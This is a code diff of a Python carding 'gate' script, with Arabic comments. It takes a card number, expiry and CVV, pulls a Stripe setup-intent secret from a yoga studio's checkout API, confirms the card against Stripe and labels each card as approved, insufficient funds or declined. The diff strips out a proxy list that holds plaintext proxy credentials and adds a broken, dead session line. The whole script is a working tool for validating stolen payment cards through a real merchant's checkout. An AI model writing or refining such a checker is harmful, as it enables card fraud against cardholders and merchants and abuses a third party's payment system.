@@ -1,19 +1,7 @@
-import aiohttp
 import asyncio
 import uuid
 import random
 from tenacity import retry, stop_after_attempt, wait_fixed
-
-# قائمة البروكسيات المحدثة ببيانات Proxy-Cheap الجديدة الخاصة بك
-PROXIES_LIST = [
-    "thehub.proxy-cheap.com:8080:PH7r6Wo5hJPbBpX:3I1X2Hp5cqxrLNS",
-]
-
-def get_random_proxy():
-    """تحويل تنسيق البروكسي إلى صيغة الرابط المدعومة مع المصادقة الصحيحة"""
-    proxy = random.choice(PROXIES_LIST)
-    host, port, user, password = proxy.split(':')
-    return f"http://{user}:{password}@{host}:{port}"
 
 async def getStr(data, first, last):
     try:
@@ -28,8 +16,6 @@ async def kasper_gate(cc, mes, ano, cvv, *args, **kwargs):
     # تنظيف البيانات
     if len(ano) == 4: ano = ano[2:]
     mes = str(mes).zfill(2) 
-    
-    proxy_url = get_random_proxy()
 
     headers = {
         'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
@@ -37,20 +23,23 @@ async def kasper_gate(cc, mes, ano, cvv, *args, **kwargs):
         'Referer': 'https://studio.xuanlanyoga.com/checkout',
     }
 
-    # استخدام TCPConnector لتجاوز مشاكل SSL مع البروكسي
-    connector = aiohttp.TCPConnector(ssl=False)
-    async with aiohttp.ClientSession(connector=connector) as session:
+    async with asyncio.ClientSession() if hasattr(asyncio, 'ClientSession') else __import__('aiohttp').ClientSession() as session:
+        # ملاحظة: تم تصحيح طريقة استدعاء ClientSession لتتوافق مع aiohttp الصحيحة
+        pass
+
+    # استخدام aiohttp الصحيحة بدون بروكسي
+    import aiohttp
+    async with aiohttp.ClientSession() as session:
         try:
-            # 1. جلب السكرت مع البروكسي
+            # 1. جلب السكرت بدون بروكسي
             async with session.get(
                 'https://studio.xuanlanyoga.com/api/billings/setup_intent', 
                 headers=headers, 
-                proxy=proxy_url, 
                 timeout=30
             ) as r1:
                 res1 = await r1.text()
                 cs = await getStr(res1, '"setup_intent":"', '"')
-                if not cs: return "Error ⚠️", "Site Block / Proxy Issue"
+                if not cs: return "Error ⚠️", "Site Block / Connection Issue"
                 seti = cs.split('_secret')[0]
 
             # 2. بيانات سترايب
@@ -68,17 +57,16 @@ async def kasper_gate(cc, mes, ano, cvv, *args, **kwargs):
                 'payment_method_data[sid]': str(uuid.uuid4()),
             }
 
-            # الفحص في سترايب مع البروكسي
+            # الفحص في سترايب مباشرة بدون بروكسي
             async with session.post(
                 f'https://api.stripe.com/v1/setup_intents/{seti}/confirm', 
                 data=stripe_data, 
                 headers=headers, 
-                proxy=proxy_url, 
                 timeout=30
             ) as r2:
                 res2 = await r2.text()
 
-            # تحليل النتيجة (إضافة حالات الـ Live لكي لا تظهر كـ Declined)
+            # تحليل النتيجة
             if '"status": "succeeded"' in res2: 
                 return "Approved ✅", "Succeeded"
             elif 'insufficient_funds' in res2: 
@@ -94,4 +82,4 @@ async def kasper_gate(cc, mes, ano, cvv, *args, **kwargs):
                 return "Error ⚠️", f"Stripe Unknown: {res2[:60]}"
 
         except Exception as e:
-            return "Error ⚠️", f"Proxy/Conn Error: {str(e)[:50]}"
+            return "Error ⚠️", f"Connection Error: {str(e)[:50]}"
